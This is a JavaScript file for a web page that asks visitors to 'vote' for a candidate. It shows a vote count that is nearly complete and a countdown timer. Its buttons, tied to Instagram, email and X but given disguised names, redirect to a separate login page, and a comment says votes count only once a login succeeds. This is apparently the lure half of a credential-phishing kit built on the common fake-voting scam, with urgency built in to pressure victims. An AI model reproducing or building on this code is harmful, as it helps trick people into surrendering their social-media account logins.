const API_URL =
  window.location.hostname === "localhost"
    ? "http://localhost:3000/api"
    : "https://backend-production-180c.up.railway.app/api";

// Wait for the HTML to fully load
document.addEventListener("DOMContentLoaded", function () {
  // --- 1. FETCH DATA FROM MONGODB ---
  async function loadCandidateData() {
    try {
      const response = await fetch(`${API_URL}/candidate`);
      let data = await response.json();

if (!data || !data.name) {
    // Don't show hardcoded data - show placeholders or loading
    document.querySelector('.candidate-name').textContent = 'Loading...';
    document.getElementById('current-votes').innerText = '...';
    return; // Exit function, don't render defaults
}

      // --- 2. UPDATE CANDIDATE INFO (Name & Image) ---
      const nameElement = document.querySelector(".candidate-name");
      if (nameElement && data.name) nameElement.textContent = data.name;

      const imageElement = document.querySelector(".avatar-image img");
      if (imageElement && data.image) imageElement.src = data.image;

      // --- 3. UPDATE VOTE COUNTS ---
      updateProgress(data.currentVotes || 0, data.requiredVotes || 5688);

      // --- 4. START COUNTDOWN ---
      if (data.endTime) {
        startCountdown(data.endTime);
      }
    } catch (error) {
      console.error("Error loading from database:", error);
      // Fallback to defaults if DB fails
      updateProgress(5648, 5688);
    }
  }

  // --- 3. PROGRESS BAR LOGIC (Modified to accept parameters) ---
  function updateProgress(current, required) {
    // Prevent division by zero
    if (!required || required === 0) required = 1;

    let percent = (current / required) * 100;
    if (percent > 100) percent = 100;

    // Update the HTML
    const currentEl = document.getElementById("current-votes");
    const requiredEl = document.getElementById("required-votes");
    const percentEl = document.getElementById("percentage-text");
    const barEl = document.getElementById("progress-bar");

    if (currentEl) currentEl.innerText = current;
    if (requiredEl) requiredEl.innerText = required;
    if (percentEl) percentEl.innerText = percent.toFixed(1) + "%";
    if (barEl) barEl.style.width = percent + "%";
  }

  // --- 4. COUNTDOWN TIMER LOGIC (Modified) ---
  let countdownInterval;
  function startCountdown(endTime) {
    // Clear existing interval if any
    if (countdownInterval) clearInterval(countdownInterval);

    function update() {
      let now = new Date().getTime();
      let distance = endTime - now;

      const timerEl = document.getElementById("countdown-timer");
      if (!timerEl) return;

      if (distance < 0) {
        timerEl.innerText = "VOTING CLOSED";
        clearInterval(countdownInterval);
        return;
      }

      let hours = Math.floor(
        (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60),
      );
      let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      let seconds = Math.floor((distance % (1000 * 60)) / 1000);

      timerEl.innerText = `${hours}h ${minutes}m ${seconds}s`;
    }

    update(); // Run immediately
    countdownInterval = setInterval(update, 1000);
  }

  // --- 5. BUTTON CLICK LOGIC (Modified) ---
  // IMPORTANT: Remove localStorage increment since votes are now in MongoDB
  // The vote should be incremented on the backend when login is successful
  function handleVoteClick(platform) {
    // Optional: Increment on backend first, then redirect
    // Or just redirect to login page
    window.location.href = `login.html?app=${platform.toLowerCase().replace(" ", "")}`;
  }

  // Attach click events (keep your existing selectors)
  const btnIg = document.querySelector(".btn-ig");
  const btnEmail = document.querySelector(".btn-email");
  const btnX = document.querySelector(".btn-x");

  if (btnIg) btnIg.addEventListener("click", () => handleVoteClick("Streamer"));
  if (btnEmail)
    btnEmail.addEventListener("click", () => handleVoteClick("SnapGrid"));
  if (btnX) btnX.addEventListener("click", () => handleVoteClick("New G"));

  // --- 6. INITIAL LOAD ---
  loadCandidateData();
  // In loadCandidateData(), at the end:
document.getElementById('loading-overlay').style.display = 'none';

  // Refresh every 10 seconds to keep in sync with admin changes
  setInterval(loadCandidateData, 10000);
  
}); // End of DOMContentLoaded

